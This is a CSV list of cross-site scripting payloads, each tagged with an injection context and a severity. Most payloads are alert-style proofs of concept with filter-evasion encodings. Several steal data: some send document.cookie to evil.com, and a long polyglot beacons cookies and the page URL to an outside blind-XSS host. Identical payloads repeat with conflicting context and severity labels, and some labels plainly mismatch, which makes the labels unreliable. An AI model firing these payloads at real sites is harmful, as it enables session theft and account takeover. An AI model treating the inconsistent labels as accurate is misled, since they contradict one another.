payload,context,severity
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<%= alert(1) %>,event_handler,low
${alert(1)},template_injection,low
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
confirm(),tag_injection,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,high
\' onerror=alert(1)//,attribute_escape,medium
' onmouseover=alert(1) ',attribute_escape,low
innerHTML=location.hash>#<script>confirm(1)</script>,tag_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<svg onload=alert(1)>,event_handler,high
""" onfocus=alert(1) autofocus=""",attribute_escape,high
"onerror=""top.alert(1)""",tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
alert(2),tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
<svg src=x onerror=alert(1)>,tag_injection,high
'});alert(document.cookie);//',script_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
#{alert(1)},template_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",attribute_escape,low
javascr/**/ipt:confirm(1),js_uri,low
onwheel='alert(1)',tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"""><svg
 onload=alert()>",tag_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
<SCRIPT>alert(	1)</SCRIPT>,script_injection,high
"eval(""alert(1)"")",dom_sink,low
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
' onerror=alert(1) x=',attribute_escape,high
""" onfocus=alert(1) autofocus=""",attribute_escape,high
<img/src=x onerror=alert(1)//>,js_uri,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
<img src=x onerror=alert(1)>,template_injection,low
prompt(9),tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
prompt(9),tag_injection,medium
<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)>,event_handler,medium
;confirm`1`;,attribute_escape,medium
<%= alert(1) %>,template_injection,high
<SCRIPT>confirm(1)</SCRIPT>,script_injection,medium
%3Csvg%20onload=alert(%22MrHex88%22)%3E,tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
onerror=alert;throw 23;,tag_injection,low
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
${alert(1)},template_injection,high
"""><img src=x onerror=confirm(1)>",attribute_escape,high
"#""><Svg oNlOAD=ALErt(1)>",attribute_escape,medium
prompt(9),tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
<svgonload=alert(1)>,tag_injection,medium
javascript:confirm(1),js_uri,high
onerror=alert;throw 23;,tag_injection,low
<%= alert(1) %>,template_injection,medium
"<object data=""javascript:alert(1)"">",attribute_escape,low
<svg ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
\' onerror=confirm(1)//,attribute_escape,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
<body onload=alert(1)>,event_handler,high
<svgonload=alert(1)>,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,low
javaScRipt:prompt`1`,js_uri,medium
alert(2),tag_injection,medium
<script>prompt(1)</script>,script_injection,medium
<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
<scRIPt>d.innErHTML+='';</sCRipt>,tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E,tag_injection,medium
{{7*7}},template_injection,high
onerror='alert(1)',tag_injection,medium
prompt(9),tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute_escape,low
"""><svg onload=alert()>",tag_injection,medium
javascript:alert(document.domain),js_uri,high
<%= alert(1) %>,template_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
confirm(),tag_injection,medium
"eval(""alert(1)"")",dom_sink,high
"?alert(1)"",",tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
' onerror=alert(1) x=',dom_sink,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
<body onload=alert(1)>,event_handler,medium
"<object data=""javascript:confirm(1)"">",js_uri,medium
#{alert(1)},template_injection,low
"""><svg onmouseenter=alert(1)>",attribute_escape,medium
<script>confirm(document.domain)</script>,script_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
<img src/onerror=prompt(8)>,tag_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<svg/onload=alert(1)>,tag_injection,medium
javascript:alert(document.domain),js_uri,low
javascript:alert(1),attribute_escape,medium
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,high
<svgonload=alert(1)>,tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<svgonload=alert(1)>,tag_injection,medium
#{alert(1)},template_injection,high
{{_s.constructor('alert(1)')()}},script_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
""" onerror=alert(1) x=""",attribute_escape,medium
<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
alert(2),tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
"\"" onerror=alert(1)//",attribute_escape,high
<script>alert(document.domain)</script>,script_injection,high
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,medium
setInterval('ale'+'rt(10)');,tag_injection,high
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,low
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
<script>prompt(1)</script>,event_handler,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
"data:text/html,<script>alert(1)</script>",template_injection,low
<img src=x onerror=alert(1)>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
<img src=x onerror=confirm(1)>,tag_injection,high
&quot; onerror=alert(1) x=&quot;,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
\' onerror=alert(1)//,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<%= al'+'ert(1) %>,template_injection,low
"<iframe src=""javascript:confirm(1)"">",script_injection,medium
onload&#61;'alert(1)',tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",attribute_escape,medium
onerror='alert(1)',tag_injection,medium
javaSCRIPT:confirm(1),js_uri,low
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
' %3E%3Cimg src=x onerror=alert(1)%3E,tag_injection,medium
onlOAD='aleRt(1)',attribute_escape,medium
"data:text/html,<script>alert(1)</script>",js_uri,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
<%= alert(1) %>,template_injection,low
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,medium
"""><a>a</a><img src=x onerror=alert(document.cookie)>{{9-9}}';alert(0);://",script_injection,high
onload='prompt(1)',tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
#{al'+'ert(1)},template_injection,low
<svg////////onload=alert(1)>,tag_injection,medium
"""><script/ alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
alert(1);,tag_injection,medium
alert(1);,tag_injection,medium
onerror=print();>,tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,medium
\' onerror=alert(1)//,event_handler,low
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
javascript:confirm(1),js_uri,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
-alert(23)/,tag_injection,medium
"""><img src=x onerror=alert(1)>",attribute_escape,medium
""" oNeRrOr=aLeRt(1) X=""",template_injection,low
javascript:alert(1),js_uri,high
"onloaD=""ALerT(1)""",tag_injection,medium
' ><img src=x onerror=alert(1)>,attribute_escape,low
<%= alert(1) %>,template_injection,high
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",js_uri,high
"setTimeout(	""alert(	1)"",0)",dom_sink,low
<svg/onload=alert(1)>,tag_injection,medium
"<embed src=""javascript:confirm(1)"">",attribute_escape,medium
prompt(9),tag_injection,medium
"<iframe>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
javascr/**/ipt:alert(document.domain),js_uri,medium
&lt;img src=x onerror=alert(1)&gt;,tag_injection,low
javascript:alert(1),js_uri,low
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror=alert(0);>,tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<body onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,medium
onerror=alert(0);>,tag_injection,medium
' ><img src=x onerror=\u0061\u006cert(1)>,js_uri,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",tag_injection,high
<img/src/onerror=alert(1),tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
javascript:alert(document.domain),js_uri,high
<details open ontoggle=alert(1)>,event_handler,high
"eval(""alert(1)"")",dom_sink,medium
<script>prompt(1)</script>,script_injection,low
"eval(""al'+'ert(1)"")",dom_sink,medium
confirm(),tag_injection,medium
<input onfocus=confirm(1) autofocus>,event_handler,low
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",tag_injection,high
""" oNlOaD=AlErT(1) x=""",attribute_escape,low
"alert`1`)//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",tag_injection,high
<img src/onerror=prompt(8)>,tag_injection,medium
"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,medium
onload='alert(1)',tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
' ><img src=x onload=alert(1)>,attribute_escape,low
' onerror=alert(1) x=',attribute_escape,medium
"javascript:void(document.location=""http://evil.com"")",tag_injection,medium
<body onload=alert(1)>,event_handler,high
"onerror=""alert(1)""",tag_injection,medium
<BODY ONLOAD=alert(’XSS’)>,tag_injection,medium
javascript:alert(document.domain),js_uri,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
"<object data=""javascript:alert(1)"">",dom_sink,low
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
alert(2),tag_injection,medium
"&lt;script&gt;document.location=""http://evil.com/?c=""+document.cookie&lt;/script&gt;",script_injection,low
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
%3cimg onerror=prompt(1) src=a%3e,attribute_escape,medium
<svg onload=alert(1)>,dom_sink,medium
"""><svg onload=alert()>",tag_injection,medium
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
\x3cdetails open ontoggle=alert(1)\x3e,event_handler,low
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"\""><img src=x onerror=confirm(1)>",event_handler,medium
"<iframe src=""javascript:alert(1)"">",event_handler,high
"javascript://'/</TitLE></sTYlE></tEXTaREA></SCriPt>--><p"" %0D %0A oNcLicK=alErt(123)//>*/ALErT()/*<imG srC=X OnerrOR=alERt(456)/><sVG/OnLoad=PRoMpt(789)/>;'""// :;fn();%0a%0d\N\r\T{{12*12+'aUDI Rs5'.suBStr(0,4)}}XxX<scriPt>alERT('anONKRYpTiQUZ')<Img SRc=x oNERRoR='(fUnCtIoN s(){vaR I=NEW IMAGe();I.srC='httP://Bl4dE.TECh/BxsS.pHp?c='+doCuMENT.CooKiE+';'+EncoDeURicOMpOnENt(lOcation.href);DOcumENT.BOdy.appEND(i)})()'/>#JavaScripT:/*-/*`/*\\`/*'/*\""/**/(/* */OncLiCK=ALeRt() )//%0d%0a%0D%0A//</StyLe/</titlE/</teXtaReA/</SCrIPt/--!>\\X3CSVg/<sVg/oNLOAD=aLErt()//>\\x3E",script_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
innerHTML=location.hash>#<script>alert(1)</script>,attribute_escape,high
onload='self.alert(1)',tag_injection,medium
onerror=prompt(1);>,tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"onbeforeinput=""alert(1)""",attribute_escape,medium
"eval(""alert(1)"")",dom_sink,high
"#""><svg onload=alert(1)>",attribute_escape,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<details open ontoggle=alert(1)>,event_handler,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"javascript:void(document.location=""http://evil.com"")",attribute_escape,low
"location=""javascript:alert(1)""",dom_sink,high
{{7*7}},template_injection,low
<script>confirm(1)</script>,script_injection,high
' onmouseover=alert(1) ',attribute_escape,high
{{7*7}},template_injection,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
<img src/onerror=alert(1)>,tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",attribute_escape,high
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
"data:text/html,<script>alert(1)</script>",js_uri,medium
<body onload=alert(1)>,event_handler,high
<svgonload=alert(1)>,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",js_uri,medium
onmouseenter='alert(1)',attribute_escape,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
%3Csvg/onload=alert(1)%3E,tag_injection,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
\x3csvg onload=alert(1)\x3e,attribute_escape,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,high
setInterval('ale'+'rt(10)');,tag_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<svg id=1 onload=confirm(1)>,tag_injection,medium
<svg onload=alert()>,tag_injection,medium
"onerror=""confirm(1)""",attribute_escape,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<video src=x onerror=alert(1)>,event_handler,low
${aLeRt(1)},template_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
<svg src=x onerror=alert(1)>,tag_injection,high
<script>al'+'ert(document.domain)</script>,script_injection,high
"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<svgonload=alert(1)>,tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"<svg/onload=alert(String.fromCharCode(88,83,83))>",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute_escape,high
<select ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"<svg>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"""><sCrIpT AlERT(STring.fRomcHaRCoDe(88,83,83))</ScRipT>",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
""" onfocus=al'+'ert(1) autofocus=""",attribute_escape,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
""" onload=alert(1) x=""",attribute_escape,medium
<script>confirm(1)</script>,script_injection,high
onerror=alert(0);>,tag_injection,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
""" onerror
=alert(	1) x
=""",attribute_escape,low
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
<script>alert(document.domain)</script>,js_uri,low
+alert(1)+,tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<SCRIPT>prompt(1)</SCRIPT>,attribute_escape,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"< vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",tag_injection,high
<svg////////onload=alert(1)>,tag_injection,medium
%3Cvideo src=x onerror=alert(1)%3E,event_handler,low
